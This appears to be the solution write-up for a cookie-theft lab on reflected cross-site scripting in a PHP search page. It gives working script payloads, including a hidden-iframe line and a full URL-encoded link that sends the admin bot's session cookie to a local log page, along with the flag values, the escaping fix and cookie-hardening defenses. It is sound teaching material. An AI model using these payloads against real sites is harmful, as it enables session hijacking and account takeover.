# Cross-Site Scripting: Cookie Theft — Solution

> ⚠️ **Spoilers below.** The flag, every payload, and the fix. If you want to
> solve it yourself, close this file and turn the debug dial up instead.

## The vulnerability

`critical.php` echoes the raw `q` parameter straight into the page:

```php
<?php if (!empty($_GET["q"])):?>
  <p>Unfortunately, the search for <i><?php echo $_GET["q"];?></i> returned no results.</p>
<?php endif;?>
```

There is no `htmlspecialchars`, so whatever you put in `q` is parsed as HTML —
including a `<script>` tag. That is **reflected XSS**: your input bounces off the
server and executes in whoever's browser rendered the response. Set the debug
dial to **Hints** (`?debug=1`) to get a multi-line editor for `q` and to see the
session cookie the server hands the page.

## Walkthrough

The three pages: `search.php` (the vulnerable reflection), `chat.php` (hands a
link to the admin bot), and `log.php` ("Web Analytics" — records every request's
URL and User-Agent). Your own login is **Alice**
(`5uper5ecret5ession5trin9`); the target is the **Admin**
(`1tW0rk5!4real`), which only ever lives in the admin bot's browser.

### a) Find the reflection

Search for anything that has no results. The page prints `the search for <your
term> returned no results.` — and your term lands *inside* the HTML, unescaped.
Confirm it is HTML, not text, by injecting a tag: search for `<b>hi</b>` and watch
"hi" render bold. If a tag renders, a script will run.

### b) Read your own cookie

Prove code execution reads the cookie. In the search box (use the **Hints**
editor so the tag survives):

```html
<script>alert(document.cookie)</script>
```

The alert shows `session=…` — the current cookie, readable from JavaScript. That
readability is the entire weakness you are about to weaponize.

### c) Log in with a stolen cookie

You have been handed a cookie someone else already stole: `0123456789abcdef`.
Wearing it *is* being that user. Set it and reload `search.php`:

- **DevTools:** Application → Cookies → set `session` = `0123456789abcdef`, or
- **Console:** `document.cookie = "session=0123456789abcdef"`

Reload and the greeting changes to **"Hello 0ldFri3nd"** — no password, just the
cookie. This is why a stolen cookie is worth stealing: it is a login.

### d) Load a page in the background

To exfiltrate you need the victim's browser to make a request *you* choose,
silently. A hidden `<iframe>` does exactly that:

```html
<script>document.write('<iframe src="log.php" style="display:none"></iframe>')</script>
```

Search that, then open **Web Analytics** — a new entry for `log.php` appeared,
even though you never visited it. The script made the browser fetch it.
`display:none` means nothing showed on screen.

### e) Dry-run the exfil on yourself

Now attach the cookie to that background request. `log.php` records the full URL,
so smuggle the cookie into the query string:

```html
<script>document.write('<iframe src="log.php?c='+encodeURIComponent(document.cookie)+'" style="display:none"></iframe>')</script>
```

Search it as yourself, open **Web Analytics**, expand the newest entry — the URL
reads `log.php?c=session%3D5uper5ecret5ession5trin9`. You just stole your own
cookie through the log. In a real attack `log.php` would be the attacker's own
collector; here it stands in for one so the whole thing works offline.

### f) Steal the admin's cookie

The admin will not type your payload — but they will click a *link*. Reflected
XSS lives in the URL, so bake the payload into a `search.php` link and hand it to
the admin in the chat. The full URL (payload from **e**, URL-encoded into `q`):

```
http://localhost:9000/search.php?q=%3Cscript%3Edocument.write%28%27%3Ciframe%20src%3D%22log.php%3Fc%3D%27%2BencodeURIComponent%28document.cookie%29%2B%27%22%20style%3D%22display%3Anone%22%3E%3C%2Fiframe%3E%27%29%3C%2Fscript%3E
```

Paste that into **Chat with the Admin** and send it. The admin bot
(`adminclicks.py`, a headless Chromium) opens your link *carrying its own cookie*
`1tW0rk5!4real`. Your script runs in the bot's browser, the hidden iframe fires a
request to `log.php` with the admin's cookie in the query string, and the bot
strips the `:9000` on its way in — inside the container it is always port 80, so
the link still resolves.

Open **Web Analytics** and expand the newest entry:

```
log.php?c=session%3D1tW0rk5!4real
```

- **Flag (admin session cookie):** `1tW0rk5!4real`

Set that cookie on `search.php` (task **c** method) and you are greeted
**"Hello Admin"**. Session hijacked.

### g) The victim sees nothing

Look at what the admin experienced. The link opened a perfectly ordinary search
page that said "returned no results" — the payload produced no visible output,
and the `display:none` iframe is invisible. In the chat, **Hints** (`?debug=1`)
shows the admin bot's JS console — no errors — and **Debug** (`?debug=2`) adds the
**Page Seen by Admin** dump: nothing on screen either. A convincing "hey, our search page looks broken, can you check this link?"
is all it took.

## Flags

| Task | What | Value |
|------|------|-------|
| c | handed-to-you cookie (login as `0ldFri3nd`) | `0123456789abcdef` |
| f | admin session cookie | `1tW0rk5!4real` |

## The fix

Escape the reflection so input can never be parsed as HTML. Open the **Fix**
editor and replace the body of `critical.php`:

```php
<?php if (!empty($_GET["q"])):?>
  <p>Unfortunately, the search for <i><?php echo htmlspecialchars($_GET["q"]); ?></i> returned no results.</p>
<?php endif;?>
```

Save, then retry every payload above: `<` and `>` render as literal `&lt;`/`&gt;`
text, the script never executes, and the admin's link is inert. **Restore
Original** brings the bug back for the next learner.

## Professional tools

There is no automated "solver" the way `sqlmap` dumps SQLi — the manual chain
above *is* the technique. What a real engagement changes is the tooling around
it:

- **Browser DevTools** carries the whole loop: **Console** for `document.cookie`,
  **Application → Cookies** to set and inspect the session, and **Network** to
  watch the hidden iframe's request fire in real time.
- **`curl`** to craft and sanity-check the `search.php?q=…` URL before you send
  it, and to confirm the reflection with `curl -s "http://localhost:9000/search.php?q=<b>x</b>"`.
- **The collector.** Here `log.php` is the exfiltration sink so everything runs
  offline. On a real test that is replaced by *your own* server, a
  **Burp Collaborator** instance, or a request bin — anything that logs the
  inbound request and shows you the cookie in its query string.

The lesson: the payloads teach you *why* the chain works — reflection → script →
background request → collector; the tooling is just how you run it at scale once
you understand it.

## Further defenses

Escaping output (the fix above) stops *this* reflection, but harden the cookie
itself so a leak is worthless:

- **`HttpOnly`** — mark the session cookie HttpOnly and `document.cookie` can no
  longer read it. This exact theft dies at the source, even if a reflection slips
  through.
- **`Secure` + `SameSite`** — keep the cookie off plaintext connections and out of
  cross-site requests.
- **Content-Security-Policy** — a CSP that forbids inline scripts stops an
  injected `<script>` from running at all.
- **Escape everywhere.** Note `chat.php` renders the submitted link's `href`
  unescaped too (outside `critical.php`) — every output sink needs the same
  discipline, not just the one you patched.
